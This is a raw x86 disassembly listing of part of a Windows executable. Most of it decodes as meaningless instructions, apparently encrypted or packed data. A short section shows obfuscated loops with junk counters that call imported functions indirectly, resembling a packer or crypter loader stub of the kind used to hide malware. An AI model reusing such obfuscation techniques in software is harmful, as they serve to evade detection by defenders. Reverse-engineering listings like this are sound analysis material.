  4110d3:	xor    ch,BYTE PTR [esi+0x2d057d76]
  4110d9:	xchg   edx,eax
  4110da:	xor    cl,ch
  4110dc:	in     al,dx
  4110dd:	jns    0x4110d1
  4110df:	adc    ah,BYTE PTR [esi]
  4110e1:	je     0x411077
  4110e3:	out    dx,al
  4110e4:	(bad)  
  4110e6:	push   ds
  4110e7:	ss enter 0x573c,0xca
  4110ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4110ed:	dec    eax
  4110ee:	jge    0x411116
  4110f0:	sbb    BYTE PTR ds:[eax],dh
  4110f3:	lahf   
  4110f4:	jg     0x41111e
  4110f6:	and    eax,0xe4677073
  4110fb:	jnp    0x4110fd
  4110fd:	js     0x4110ac
  4110ff:	xchg   ecx,eax
  411100:	jmp    0x3ceb:0x50870f82
  411107:	shr    ah,0x9f
  41110a:	cmp    esp,esi
  41110c:	in     eax,0x6c
  41110e:	sub    eax,0x922d697
  411113:	jae    0x411154
  411115:	outs   dx,DWORD PTR ds:[esi]
  411116:	or     DWORD PTR [ebx-0x3087f2d6],0xffffffb2
  41111d:	mov    ds:0x610be939,al
  411122:	jne    0x41114f
  411124:	add    dh,dh
  411126:	repnz pop ss
  411128:	imul   ebp,DWORD PTR [ecx+0x6dbd686a],0xffffffe5
  41112f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411130:	out    0xd2,al
  411132:	fdivr  DWORD PTR [edi+0x1c]
  411135:	test   BYTE PTR [ecx+0x36fc002a],al
  41113b:	push   eax
  41113c:	pop    ebx
  41113d:	pop    esp
  41113e:	jp     0x4111a3
  411140:	enter  0x9f1e,0xb3
  411144:	xor    cl,dh
  411146:	push   es
  411147:	mov    esi,DWORD PTR [esi+0x1b]
  41114a:	push   0x448341e1
  41114f:	fadd   QWORD PTR [ebx]
  411151:	jne    0x41116f
  411153:	enter  0xd5a2,0x3f
  411157:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411158:	aad    0x6a
  41115a:	out    0x75,al
  41115c:	bound  ecx,QWORD PTR [esi+0x71e87e91]
  411162:	xor    BYTE PTR [edi-0x19],bh
  411165:	stos   BYTE PTR es:[edi],al
  411166:	sub    eax,0x744b38b9
  41116b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41116c:	bound  edi,QWORD PTR [edx]
  41116e:	mov    ebx,0x4d1efda3
  411173:	ret    0x12ff
  411176:	or     ah,BYTE PTR [esi+ebx*4+0x7]
  41117a:	add    dl,ch
  41117c:	dec    edi
  41117d:	and    edi,DWORD PTR [eax+ebx*8+0x42e35c41]
  411184:	ins    DWORD PTR es:[edi],dx
  411185:	lods   al,BYTE PTR ds:[esi]
  411186:	iret   
  411187:	in     eax,dx
  411188:	push   ds
  411189:	outs   dx,BYTE PTR ds:[esi]
  41118a:	mov    DWORD PTR [edx+ebp*2-0x42a45c5f],ebx
  411191:	add    dh,BYTE PTR [ebx]
  411193:	and    eax,0x738971e2
  411198:	icebp  
  411199:	test   DWORD PTR [esi-0x56],0xabc5633a
  4111a0:	pop    ecx
  4111a1:	stos   DWORD PTR es:[edi],eax
  4111a2:	mov    ds:0x183b4d64,eax
  4111a7:	cmp    ch,BYTE PTR [ebx+0x2ebdc61e]
  4111ad:	and    eax,0x1b3bd69a
  4111b2:	jmp    0x411220
  4111b4:	scas   eax,DWORD PTR es:[edi]
  4111b5:	in     eax,0x0
  4111b7:	ror    DWORD PTR [ebx],1
  4111b9:	scas   al,BYTE PTR es:[edi]
  4111ba:	adc    eax,0x8e97f3d3
  4111bf:	mov    ch,0x81
  4111c1:	push   ecx
  4111c2:	shl    DWORD PTR [ecx],cl
  4111c4:	pop    edi
  4111c5:	xchg   BYTE PTR [esi],dl
  4111c7:	mov    ah,0x25
  4111c9:	jno    0x411236
  4111cb:	fs daa 
  4111cd:	jno    0x4111e1
  4111cf:	leave  
  4111d0:	dec    edx
  4111d1:	jns    0x4111f7
  4111d3:	std    
  4111d4:	sar    BYTE PTR [edi],1
  4111d6:	push   cs
  4111d7:	mov    dl,0x29
  4111d9:	sbb    eax,0x39fa084f
  4111de:	dec    ebx
  4111df:	fnstsw WORD PTR [ecx-0x42]
  4111e2:	call   0xa0812f3c
  4111e7:	inc    edi
  4111e8:	(bad)  
  4111e9:	sub    ecx,DWORD PTR [eax]
  4111eb:	inc    ecx
  4111ec:	adc    al,0x11
  4111ee:	repnz inc esp
  4111f0:	fisttp DWORD PTR [ebp+0x65]
  4111f3:	loop   0x4111d2
  4111f5:	mov    dl,0xd7
  4111f7:	out    dx,al
  4111f8:	pop    esp
  4111f9:	retf   0x2776
  4111fc:	cmp    edi,edi
  4111fe:	dec    esp
  4111ff:	xchg   ebx,eax
  411200:	(bad)  
  411201:	xchg   ebp,eax
  411202:	inc    eax
  411203:	mov    bl,0x8c
  411205:	outs   dx,BYTE PTR ds:[esi]
  411206:	stc    
  411207:	and    al,bl
  411209:	xor    DWORD PTR es:0xd86bc443,edi
  411210:	adc    eax,0x3682270c
  411215:	push   edi
  411216:	mov    al,0x61
  411218:	push   ebp
  411219:	or     eax,0x35e20101
  41121e:	imul   esp,DWORD PTR [edx+0x20],0x4e
  411222:	xchg   esp,eax
  411223:	fwait
  411224:	push   0xffffffe5
  411226:	loope  0x411266
  411228:	adc    ebp,DWORD PTR [edi+0x6c]
  41122b:	fistp  DWORD PTR [edi+0x53]
  41122e:	cmp    DWORD PTR [edi-0x49],0xd0a57d95
  411235:	int3   
  411236:	jl     0x4111f3
  411238:	dec    edi
  411239:	adc    BYTE PTR [eax+ecx*2+0x47],ch
  41123d:	lahf   
  41123e:	push   ds
  41123f:	push   0x249a59b
  411244:	mov    ecx,0xa4987b7
  411249:	cwde   
  41124a:	mov    ebp,0x4b37b026
  41124f:	adc    ebp,esi
  411251:	in     eax,0x3e
  411253:	adc    dl,BYTE PTR [esi-0x3b]
  411256:	jmp    0x54e0:0xdfeb5054
  41125d:	scas   al,BYTE PTR es:[edi]
  41125e:	push   ss
  41125f:	lock jg 0x41125d
  411262:	ss call 0xefd4:0x3b02efa4
  41126a:	int    0xfc
  41126c:	xchg   ecx,eax
  41126d:	cmp    al,0x9b
  41126f:	js     0x4112b4
  411271:	mov    edx,0x89004b01
  411276:	add    DWORD PTR [edx],edi
  411278:	sub    edi,DWORD PTR [ebx+0x63ee646d]
  41127e:	mov    edx,0x5ff8dd34
  411283:	(bad)  
  411284:	push   ebp
  411285:	jns    0x41128b
  411287:	xor    eax,0x5966ab4
  41128c:	jmp    0x411226
  41128e:	(bad)  
  41128f:	shl    BYTE PTR [eax+eax*8-0x3eb52e62],0x4e
  411297:	test   al,0x60
  411299:	jmp    0x41123e
  41129b:	test   BYTE PTR [edi-0x179fb818],0x14
  4112a2:	fwait
  4112a3:	leave  
  4112a4:	xchg   esp,eax
  4112a5:	sbb    ebp,DWORD PTR [edi]
  4112a7:	sahf   
  4112a8:	ret    
  4112a9:	out    0xe7,al
  4112ab:	std    
  4112ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112ad:	jp     0x4112e8
  4112af:	mov    dh,0xd3
  4112b1:	jmp    0x647d:0xafc25944
  4112b8:	call   0x8cbd0daa
  4112bd:	sbb    al,0x4d
  4112bf:	mov    ah,0xb5
  4112c1:	adc    cl,BYTE PTR [ecx]
  4112c3:	test   ch,bl
  4112c5:	loope  0x411285
  4112c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112c8:	cli    
  4112c9:	push   eax
  4112ca:	lahf   
  4112cb:	call   DWORD PTR [ebp+0x30]
  4112ce:	call   0xc26f74ec
  4112d3:	mov    cl,0x54
  4112d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112d6:	popa   
  4112d7:	fsub   DWORD PTR ds:0x5129d72c
  4112dd:	in     eax,0x2
  4112df:	mov    al,0xa4
  4112e1:	shr    DWORD PTR [edx+0x6f],cl
  4112e4:	bt     DWORD PTR [edi+eax*1-0x740fccf9],edx
  4112ec:	adc    BYTE PTR [ecx+eax*1+0x88b0000],0x8b
  4112f4:	inc    ecx
  4112f5:	cmp    al,0x8b
  4112f7:	inc    esp
  4112f8:	or     BYTE PTR [eax],ch
  4112fa:	add    eax,ecx
  4112fc:	mov    DWORD PTR [ebp+0x8],esi
  4112ff:	mov    DWORD PTR [ebp+0x10],eax
  411302:	mov    eax,DWORD PTR [ebp+0x10]
  411305:	pop    esi
  411306:	test   eax,eax
  411308:	je     0x41132c
  41130e:	push   DWORD PTR ds:0x414bd6
  411314:	push   DWORD PTR ds:0x414982
  41131a:	mov    eax,DWORD PTR [edx+0x194]
  411320:	push   DWORD PTR [eax]
  411322:	mov    eax,DWORD PTR [ebp+0x10]
  411325:	call   eax
  411327:	jmp    0x41132f
  41132c:	mov    eax,DWORD PTR [ebp+0x10]
  41132f:	leave  
  411330:	ret    0xc
  411333:	push   ebp
  411334:	mov    ebp,esp
  411336:	sub    esp,0x30
  411339:	mov    DWORD PTR [ebp-0x4],0xf89c8536
  411340:	mov    ecx,DWORD PTR ds:0x434703
  411346:	xor    DWORD PTR ds:0x4346cf,ecx
  41134c:	mov    DWORD PTR [ebp-0x18],0xf89c8539
  411353:	mov    DWORD PTR ds:0x4345ff,0x14
  41135d:	cmp    DWORD PTR ds:0x4345ff,0x0
  411364:	je     0x4113b9
  41136a:	cmp    DWORD PTR ds:0x4345ff,0x3
  411371:	jne    0x411387
  411377:	push   0x43487a
  41137c:	push   0x400000
  411381:	call   DWORD PTR ds:0x4130d8
  411387:	cmp    DWORD PTR ds:0x4345ff,0x4
  41138e:	jne    0x41139f
  411394:	mov    eax,ds:0x4345ff
  411399:	dec    eax
  41139a:	mov    ds:0x4345ff,eax
  41139f:	mov    eax,ds:0x4345ff
  4113a4:	dec    eax
  4113a5:	mov    ds:0x4345ff,eax
  4113aa:	jmp    0x41135d
  4113af:	adc    DWORD PTR ds:0x4345ef,0x46ae
  4113b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4113bc:	and    DWORD PTR ds:0x434643,0x0
  4113c6:	jmp    0x4113d6
  4113cb:	mov    eax,ds:0x434643
  4113d0:	inc    eax
  4113d1:	mov    ds:0x434643,eax
  4113d6:	cmp    DWORD PTR ds:0x434643,0x18
  4113dd:	jae    0x411423
  4113e3:	cmp    DWORD PTR ds:0x434643,0xf
  4113ea:	jne    0x411406
  4113f0:	push   0x43467f
  4113f5:	push   0x4743
  4113fa:	push   DWORD PTR [ebp-0x1c]
  4113fd:	push   DWORD PTR [ebp-0x10]
  411400:	call   DWORD PTR ds:0x4132ac
  411406:	cmp    DWORD PTR ds:0x434643,0xe
  41140d:	jne    0x41141e
  411413:	mov    eax,ds:0x434643
  411418:	inc    eax
  411419:	mov    ds:0x434643,eax
  41141e:	jmp    0x4113cb
  411423:	push   ebx
  411424:	mov    eax,0x7510851
  411429:	xor    ecx,eax
  41142b:	and    DWORD PTR ds:0x43470f,0x0
  411435:	mov    ebx,DWORD PTR ds:0x43470f
  41143b:	inc    ebx
  41143c:	mov    DWORD PTR ds:0x43470f,ebx
  411442:	cmp    DWORD PTR ds:0x43470f,0x6
  411449:	jne    0x411462
  41144f:	push   DWORD PTR [ebp-0x10]
  411452:	push   0x434693
  411457:	push   0x4347db
  41145c:	call   DWORD PTR ds:0x413360
  411462:	cmp    DWORD PTR ds:0x43470f,0x5
  411469:	jne    0x41147c
  41146f:	mov    ebx,DWORD PTR ds:0x43470f
  411475:	inc    ebx
  411476:	mov    DWORD PTR ds:0x43470f,ebx
  41147c:	cmp    DWORD PTR ds:0x43470f,0x10
  411483:	jb     0x411435
  411489:	movzx  ebx,WORD PTR ds:0x4345df
  411490:	adc    DWORD PTR ds:0x4346c7,ebx
  411496:	mov    ebx,0x327299
  41149b:	xor    DWORD PTR ds:0x434683,0x577
  4114a5:	add    ecx,ebx
  4114a7:	or     DWORD PTR ds:0x434703,0x4345e7
  4114b1:	mov    DWORD PTR [ebp-0x1c],ecx
  4114b4:	sbb    DWORD PTR ds:0x4346d3,edi
  4114ba:	mov    ecx,DWORD PTR [ebp+0x14]
  4114bd:	xor    DWORD PTR ds:0x4346f7,0x4345f3
  4114c7:	push   esi
  4114c8:	mov    DWORD PTR ds:0x4346cb,0x24af
  4114d2:	push   edi
  4114d3:	sbb    DWORD PTR ds:0x4345ff,0x43463f
  4114dd:	test   ecx,ecx
  4114df:	je     0x41155f
  4114e5:	mov    ecx,DWORD PTR [ebp+0x14]
  4114e8:	sbb    DWORD PTR ds:0x434713,edx
  4114ee:	mov    ecx,DWORD PTR [ecx]
  4114f0:	and    DWORD PTR ds:0x4345ff,0x0
  4114fa:	xor    edi,edi
  4114fc:	or     edi,DWORD PTR ds:0x4345ff
  411502:	inc    edi
  411503:	mov    DWORD PTR ds:0x4345ff,edi
  411509:	cmp    DWORD PTR ds:0x4345ff,0xb
  411510:	jne    0x411529
  411516:	push   0x434707
  41151b:	push   DWORD PTR [ebp-0x28]
  41151e:	push   0x707e
  411523:	call   DWORD PTR ds:0x4132b0
  411529:	cmp    DWORD PTR ds:0x4345ff,0xa
  411530:	jne    0x411545
  411536:	xor    edi,edi
  411538:	add    edi,DWORD PTR ds:0x4345ff
  41153e:	inc    edi
  41153f:	mov    DWORD PTR ds:0x4345ff,edi
  411545:	cmp    DWORD PTR ds:0x4345ff,0x14
  41154c:	jb     0x4114fa
  411552:	mov    DWORD PTR ds:0x4345e7,0x18c9
  41155c:	mov    DWORD PTR [ebp-0x1c],ecx
  41155f:	mov    DWORD PTR ds:0x4345f7,0x1a
  411569:	cmp    DWORD PTR ds:0x4345f7,0x0
  411570:	je     0x4115ca
  411576:	cmp    DWORD PTR ds:0x4345f7,0xb
  41157d:	jne    0x411592
  411583:	push   DWORD PTR [ebp-0x14]
  411586:	push   DWORD PTR [ebp-0x14]
  411589:	push   DWORD PTR [ebp-0x14]
  41158c:	call   DWORD PTR ds:0x4130dc
  411592:	cmp    DWORD PTR ds:0x4345f7,0xc
  411599:	jne    0x4115ac
  41159f:	mov    edi,DWORD PTR ds:0x4345f7
  4115a5:	dec    edi
  4115a6:	mov    DWORD PTR ds:0x4345f7,edi
  4115ac:	mov    edi,DWORD PTR ds:0x4345f7
  4115b2:	dec    edi
  4115b3:	mov    DWORD PTR ds:0x4345f7,edi
  4115b9:	jmp    0x411569
  4115be:	mov    ecx,DWORD PTR ds:0x4345eb
  4115c4:	adc    DWORD PTR ds:0x4345e3,ecx
  4115ca:	imul   edx,eax
  4115cd:	mov    ecx,0x4573
  4115d2:	mov    DWORD PTR ds:0x43470b,0x1d
  4115dc:	cmp    DWORD PTR ds:0x43470b,0x0
  4115e3:	je     0x41162d
  4115e9:	cmp    DWORD PTR ds:0x43470b,0xc
  4115f0:	jne    0x4115ff
  4115f6:	push   DWORD PTR [ebp-0x1c]
  4115f9:	call   DWORD PTR ds:0x4130e0
  4115ff:	cmp    DWORD PTR ds:0x43470b,0xd
  411606:	jne    0x41161b
  41160c:	xor    edi,edi
  41160e:	xor    edi,DWORD PTR ds:0x43470b
  411614:	dec    edi
  411615:	mov    DWORD PTR ds:0x43470b,edi
  41161b:	mov    edi,DWORD PTR ds:0x43470b
  411621:	dec    edi
  411622:	mov    DWORD PTR ds:0x43470b,edi
  411628:	jmp    0x4115dc
  41162d:	add    edx,ecx
  41162f:	jmp    0x41182f
  411634:	rol    DWORD PTR [edi+0x7d4a654a],cl
  41163a:	std    
  41163b:	mov    cl,0xe9
  41163d:	xchg   ebp,eax
  41163e:	inc    edx
  41163f:	jg     0x411679
  411641:	mov    BYTE PTR gs:[eax+0x7e7e4a8f],bl
  411648:	pop    ecx
  411649:	jg     0x4116c9
  41164b:	jle    0x411652
  41164d:	cmc    
  41164e:	inc    ebp
  411650:	test   DWORD PTR [esi],esp
  411652:	std    
  411653:	adc    eax,0x3138e9da
  411658:	out    dx,eax
  411659:	nop
  41165a:	repnz int 0x4d
  41165d:	ds jb  0x41168f
  411660:	pop    edx
  411661:	data16 hlt 
  411663:	push   ebp
  411664:	clc    
  411665:	in     al,0x84
  411667:	sbb    esp,DWORD PTR [ebx+0x4b450cf3]
  41166d:	popf   
  41166e:	add    edi,DWORD PTR [ecx+esi*1+0x5b]
  411672:	pop    edx
  411673:	das    
  411674:	mov    ah,BYTE PTR [ecx+ebp*8+0x6ee9edd3]
  41167b:	repz (bad) 
  41167d:	aad    0x91
  41167f:	arpl   cx,di
  411681:	adc    esi,DWORD PTR [esi+0x3c]
  411684:	pushf  
  411685:	dec    eax
  411686:	pop    edi
  411687:	outs   dx,DWORD PTR ds:[esi]
  411688:	jb     0x41164c
  41168a:	jns    0x411665
  41168c:	bound  ebp,QWORD PTR [eax-0x115f5f57]
  411692:	std    
  411693:	add    ah,BYTE PTR [ebx-0x73f8eb48]
  411699:	dec    esp
  41169a:	jle    0x41168a
  41169c:	mov    edi,0x93948edf
  4116a1:	rcr    BYTE PTR [ebx-0x24],cl
  4116a4:	std    
  4116a5:	(bad)  
  4116a6:	fnstcw WORD PTR [eax]
  4116a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116a9:	(bad)  
  4116aa:	jmp    0x8dbc:0xfaacd94a
  4116b1:	pop    esi
  4116b2:	jmp    0x411655
  4116b4:	hlt    
  4116b5:	ds inc ebp
  4116b7:	mov    ebx,0x415fc2c8
  4116bc:	xor    edx,DWORD PTR [edi+0x664e47ce]
  4116c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4116c3:	xor    edi,DWORD PTR [ebp-0x50]
  4116c6:	sti    
  4116c7:	pop    esi
  4116c8:	aam    0x4b
  4116ca:	ins    BYTE PTR es:[edi],dx
  4116cb:	out    0xaf,eax
  4116cd:	cmp    DWORD PTR [edi],esp
  4116cf:	jb     0x41169b
  4116d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116d2:	add    BYTE PTR [eax+edx*4-0x7],ch
  4116d6:	push   edi
  4116d7:	sti    
  4116d8:	dec    eax
  4116d9:	mov    bh,0x74
  4116db:	aaa    
  4116dc:	pop    ss
  4116dd:	inc    eax
  4116de:	out    0x65,eax
  4116e0:	shr    ebx,1
  4116e2:	push   0xdfc2a943
  4116e7:	or     eax,0xc8326f63
  4116ec:	cli    
  4116ed:	dec    edx
  4116ee:	mov    bl,0xdb
  4116f0:	das    
  4116f1:	bound  esp,QWORD PTR [ecx+0x29]
  4116f4:	dec    esi
  4116f5:	out    dx,al
  4116f6:	je     0x411754
  4116f8:	adc    ebx,DWORD PTR [ebx+esi*8-0x58a6f92b]
  4116ff:	in     al,dx
  411700:	in     al,0x8b
  411702:	lahf   
  411703:	(bad)  
  411705:	aas    
  411706:	push   0x7f6b2b98
  41170b:	and    eax,0x9ebdc97b
  411710:	lods   al,BYTE PTR ds:[esi]
  411711:	fbstp  TBYTE PTR ds:0xbe50dbbf
  411717:	xchg   ebp,eax
  411718:	xor    eax,0x50effc1b
  41171d:	or     DWORD PTR ds:0xe617b90f,ebx
  411723:	test   al,0xf6
  411725:	cld    
  411726:	add    ch,BYTE PTR [edx]
  411728:	leave  
  411729:	mov    edx,0x6fac10b0
  41172e:	cli    
  41172f:	shl    DWORD PTR [edi],0xb7
  411732:	call   0x932a:0x593123bb
  411739:	xor    BYTE PTR [ebx+0x1e67af41],cl
  41173f:	mov    bl,0xc9
  411741:	enter  0x3697,0x9e
  411745:	mov    fs,ebp
  411747:	cli    
  411748:	xchg   cl,cl
  41174a:	retf   
  41174b:	add    dh,BYTE PTR [ecx-0x35]
  41174e:	push   eax
  41174f:	mov    esp,0xb1361db8
  411754:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411755:	pop    edi
  411756:	ja     0x411727
  411758:	jg     0x4116df
  41175a:	xor    eax,0x8c4eebe0
  41175f:	shl    DWORD PTR [esi],1
  411761:	mov    ds,WORD PTR [edx]
  411763:	inc    esp
  411764:	lahf   
  411765:	nop
  411766:	or     al,BYTE PTR [ebx+eax*8-0x23]
  41176a:	pop    ebx
  41176b:	icebp  
  41176c:	idiv   DWORD PTR [ebp+0x75]
  41176f:	mov    edx,0x5304386d
  411774:	outs   dx,BYTE PTR ds:[esi]
  411775:	adc    eax,0x5e67a2f
  41177a:	push   cs
  41177b:	inc    esp
  41177c:	push   edx
  41177d:	imul   edi,esp,0xffffff99
  411780:	add    DWORD PTR [ebx],edx
  411782:	mov    ebp,0x951e3ccf
  411787:	xor    eax,0x8fe47623
  41178c:	and    edi,DWORD PTR [eax-0x1a35fc9e]
  411792:	push   ebp
  411793:	leave  
  411794:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411795:	jmp    FWORD PTR [ebx+0x49]
  411798:	aas    
  411799:	mov    DWORD PTR [esi],eax
  41179b:	xchg   esp,eax
  41179c:	pop    ss
  41179d:	or     eax,0xf910592e
  4117a2:	cmp    eax,0xee5edad0
  4117a7:	cmp    DWORD PTR [ecx+0x9],0xc8bf2141
  4117ae:	mov    eax,ds:0x49037b8
  4117b3:	rol    DWORD PTR [edx],cl
  4117b5:	push   eax
  4117b6:	xchg   ebp,eax
  4117b7:	jmp    FWORD PTR [edx+ecx*2+0x16]
  4117bb:	xchg   DWORD PTR [esi+0x20118799],edx
  4117c1:	mov    edi,0x9789cbd9
  4117c6:	ins    DWORD PTR es:[edi],dx
  4117c7:	push   0x3c
  4117c9:	ins    DWORD PTR es:[edi],dx
  4117ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117cb:	push   0x40
  4117cd:	push   0x69be7295
  4117d2:	xchg   ebx,eax
  4117d3:	int3   
  4117d4:	cmp    eax,0x25f2a43f
  4117d9:	jp     0x41175f
  4117db:	dec    edx
  4117dc:	fwait
  4117dd:	imul   edi,esp,0x1
  4117e0:	or     ecx,DWORD PTR [ebx-0x46b34aa2]
  4117e6:	or     eax,0xf3c450c6
  4117eb:	div    edi
  4117ed:	jecxz  0x4117ea
  4117ef:	mov    ds:0xcc10e10,eax
  4117f4:	ret    
  4117f5:	mov    ebp,0x8d0054cf
  4117fa:	jmp    0xe3a6:0xf1387e7c
  411801:	into   
  411802:	in     al,dx
  411803:	fadd   QWORD PTR [ecx+0x37]
  411806:	pop    ds
  411807:	outs   dx,DWORD PTR ds:[esi]
  411808:	and    BYTE PTR [ecx-0x80],dl
  41180b:	mul    DWORD PTR [ecx]
  41180d:	int3   
  41180e:	adc    al,0xf
  411810:	clc    
  411811:	test   esi,edi
  411813:	xor    ah,BYTE PTR [ecx+0x6a3b5529]
  411819:	mov    al,0xf4
  41181b:	ror    BYTE PTR [ebp-0x5a04086d],1
  411821:	bound  esp,QWORD PTR [esi]
  411823:	mov    bl,0x74
  411825:	mov    ds:0x47f1406b,al
  41182a:	inc    ecx
  41182b:	test   BYTE PTR [ecx+eax*2+0x7879be95],ch
  411832:	add    BYTE PTR [eax],al
  411834:	or     edi,0x33cc
  41183a:	mov    edi,0x1556
  41183f:	jmp    0x411a3f
  411844:	retf   0x898a
  411847:	outs   dx,DWORD PTR ds:[esi]
  411848:	dec    ecx
  411849:	jne    0x41183f
  41184b:	stos   DWORD PTR es:[edi],eax
  41184c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41184d:	loope  0x411863
  41184f:	lods   al,BYTE PTR ds:[esi]
  411850:	inc    edx
  411851:	jb     0x4118c4
  411853:	js     0x41183f
  411855:	push   esp
  411856:	jle    0x4118d6
  411858:	pop    ecx
  411859:	jg     0x4118d9
  41185b:	jle    0x411880
  41185d:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41185f:	cmp    DWORD PTR [edx-0x1b],ebx
  411862:	ret    
  411863:	and    ch,BYTE PTR [eax-0xc65977e]
  411869:	out    0x26,al
  41186b:	fld    DWORD PTR [edi]
  41186d:	xchg   edi,eax
  41186e:	imul   esi,DWORD PTR ds:0x6fa80ef3,0x3e
  411875:	mov    eax,0x807b4359
  41187a:	jne    0x411864
  41187c:	dec    edx
  41187d:	rcl    DWORD PTR [edi],1
  41187f:	jp     0x411834
  411881:	test   eax,0x440afc92
  411886:	jnp    0x41189b
  411888:	popa   
  411889:	sti    
  41188a:	fild   DWORD PTR [ebp-0x5073f49c]
  411890:	fwait
  411891:	jae    0x4118ad
  411893:	ret    
  411894:	ror    DWORD PTR [esi],1
  411896:	inc    ecx
  411897:	dec    esp
  411898:	aas    
  411899:	shl    esi,cl
  41189b:	div    DWORD PTR [edi+0x23b473d0]
  4118a1:	lds    esp,FWORD PTR [edx*1-0x101b85cb]
  4118a8:	inc    ecx
  4118a9:	lahf   
  4118aa:	and    al,0xce
  4118ac:	ret    0x6e80
  4118af:	(bad)  
  4118b0:	ret    
  4118b1:	dec    ebp
  4118b2:	clc    
  4118b3:	dec    ebp
  4118b4:	pop    edx
  4118b5:	std    
  4118b6:	push   edi
  4118b7:	pop    ss
  4118b8:	xchg   DWORD PTR [ecx],esp
  4118ba:	leave  
  4118bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118bc:	sub    eax,0x1db11ae4
  4118c1:	mov    dl,0x75
  4118c3:	(bad)
  4118c6:	fdivr  QWORD PTR ds:0x4d432890
  4118cc:	mov    bp,0xfe20
  4118d0:	retf   0x85c7
  4118d3:	jno    0x411940
  4118d5:	fbstp  TBYTE PTR [edx]
  4118d7:	sahf   
  4118d8:	push   esp
  4118d9:	clc    
  4118da:	jo     0x41187d
  4118dc:	ret    
  4118dd:	aas    
  4118de:	sbb    DWORD PTR [ecx],esp
  4118e0:	loopne 0x4118bb
  4118e2:	ins    BYTE PTR es:[edi],dx
  4118e3:	pop    edi
  4118e4:	jp     0x41189e
  4118e6:	(bad)  
  4118e7:	push   edx
  4118e8:	mov    BYTE PTR [ebx-0x29cc78cf],bh
  4118ee:	jg     0x4118ff
  4118f0:	dec    edi
  4118f1:	dec    esi
  4118f2:	adc    al,0x9d
  4118f4:	push   ebp
  4118f5:	xchg   ebp,eax
  4118f6:	mov    ds:0x153409a1,al
  4118fb:	xlat   BYTE PTR ds:[ebx]
  4118fc:	imul   edi,DWORD PTR ds:0x96504bd1,0xd3b1ced6
  411906:	mov    WORD PTR [edi+0x2f],es
  411909:	(bad)  
  41190a:	mov    ebp,0xab617a7d
  41190f:	inc    edi
  411910:	inc    edx
  411911:	call   0x15e16ba0
  411916:	test   al,0x40
  411918:	mov    esp,0xf6156e6f
  41191d:	inc    eax
  41191e:	add    al,0xb2
  411920:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411921:	mov    dl,0xbb
  411923:	dec    eax
  411924:	mov    esi,0x2ded63bf
  411929:	mov    eax,eax
  41192b:	jmp    0xae01:0x7737f257
  411932:	xor    ch,al
  411934:	and    al,0x21
  411936:	sbb    eax,0xe600731a
  41193b:	fwait
  41193c:	sub    ch,BYTE PTR [edx-0x76]
  41193f:	fimul  DWORD PTR [edx-0x3ae2cde1]
  411945:	adc    DWORD PTR [bp+di-0x2664],ecx
  41194a:	test   BYTE PTR [edx+ebp*2],bh
  41194d:	push   ecx
  41194e:	not    esi
  411950:	sub    eax,0x70b3e4b6
  411955:	jb     0x41191e
  411957:	mov    es,WORD PTR [ecx-0x3cb2988f]
  41195d:	sbb    al,0x67
  41195f:	fld    QWORD PTR [ebp+0x3c]
  411962:	adc    DWORD PTR [edi+eax*4],esp
  411965:	js     0x411908
  411967:	dec    edx
  411968:	push   ds
  411969:	bound  eax,QWORD PTR [ecx-0x73edbf30]
  41196f:	(bad)  [ebx+0x2f]
  411972:	dec    edi
  411973:	push   esi
  411974:	out    dx,al
  411975:	jl     0x411947
  411977:	adc    dl,cl
  411979:	or     eax,0xaf46ea88
  41197e:	addr16 push ds
  411980:	adc    DWORD PTR [esi],ecx
  411982:	xor    esi,DWORD PTR [edi-0x71]
  411985:	mov    cl,0x8e
  411987:	and    dl,cl
  411989:	sub    edx,DWORD PTR [ebp+0x36]
  41198c:	jecxz  0x411971
  41198e:	inc    esp
  41198f:	(bad)  
  411990:	pop    edi
  411991:	sbb    eax,0x3a7b3ddb
  411996:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411997:	icebp  
  411998:	mov    al,ds:0xdb3c2eea
  41199d:	adc    al,0x7b
  41199f:	mov    ecx,0xabe4639c
  4119a4:	ror    DWORD PTR [edi-0x1185d811],1
  4119aa:	lods   al,BYTE PTR ds:[esi]
  4119ab:	jmp    FWORD PTR [ecx]
  4119ad:	sub    DWORD PTR [eax-0x5ab315e2],eax
  4119b3:	shl    DWORD PTR [edx],cl
  4119b5:	mov    ch,0xf3
  4119b7:	or     dl,BYTE PTR [ecx]
  4119b9:	sahf   
  4119ba:	pop    ebp
  4119bb:	inc    ecx
  4119bc:	sub    DWORD PTR [ecx],edx
  4119be:	ins    BYTE PTR es:[edi],dx
  4119bf:	or     DWORD PTR [ecx+0x7f],ebp
  4119c2:	jae    0x411988
  4119c4:	arpl   WORD PTR [ecx+edx*8+0x5b008ef9],dx
  4119cb:	push   ebx
  4119cc:	mov    ds:0x8c5fcd01,eax
  4119d1:	inc    esp
  4119d2:	in     al,dx
  4119d3:	and    DWORD PTR [edi],eax
  4119d5:	cmp    DWORD PTR [eax],ecx
  4119d7:	gs mov dl,0x1b
  4119da:	loope  0x411a20
  4119dc:	es cdq 
  4119de:	lea    edi,[ebx+0x17]
  4119e1:	pop    ds
  4119e2:	cmp    edi,esi
  4119e4:	jns    0x41199c
  4119e6:	xchg   esi,eax
  4119e7:	jns    0x411986
  4119e9:	or     al,0xbc
  4119eb:	cmp    esi,DWORD PTR [ecx-0x3b286854]
  4119f1:	gs adc al,0x32
  4119f4:	imul   ecx,ebx,0x6c1c5e2f
